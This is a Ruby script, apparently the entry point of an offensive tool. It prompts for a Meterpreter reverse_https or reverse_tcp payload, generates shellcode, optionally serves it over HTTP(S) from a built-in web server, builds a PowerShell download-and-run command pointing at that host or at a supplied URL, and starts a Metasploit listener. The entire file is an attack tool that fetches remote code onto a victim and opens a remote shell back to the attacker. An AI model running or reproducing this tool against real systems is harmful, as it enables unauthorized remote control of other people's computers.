#!/usr/bin/env ruby
require_relative 'lib/core'
require_relative 'lib/server'
require_relative 'lib/menu'
include MainCommands
include MsfCommands
include Menu
def payload_select
  puts "Please pick the payload you would like to use\n"
  print "
    \n1) windows/meterpreter/reverse_https \
    \n2) windows/meterpreter/reverse_tcp \
    \n"
  choice = get_input('> ', 1)
  choice.to_i
end
begin
  if Process.uid != 0
    print_error("Must run as root!\n")
    exit
  end
  server = Server.new
  msfhost_alert
  msf_host = server.set_host
  msf_port = server.set_port
  payload = payload_select
  payload = payload_select until payload == 1 || payload == 2
  payload = available_payloads(payload)
  hosting = get_input('Host the powershell script?[yes/no] ', 'yes')
  if hosting.downcase[0] == 'y'
    webhost_alert
    webserver_host = server.set_host
    webserver_port = server.set_port
    shell_code = generate_shellcode(msf_host, msf_port, payload)
    ssl = get_input('Would you like to use ssl?[yes/no] ', 'yes')
    ssl = true if ssl.downcase[0] == 'y'
    Thread.new do
      server.ruby_web_server(webserver_port, ssl, webserver_host, shell_code)
    end
    if ssl
      powershell_command("https://#{webserver_host}:#{webserver_port}")
    else
      powershell_command("http://#{webserver_host}:#{webserver_port}")
    end
    metasploit_setup(msf_host, msf_port, payload)
  else
    url = get_input('Enter the url that holds the powershell script: ')
    powershell_command(url)
    metasploit_setup(msf_host, msf_port, payload)
  end
end
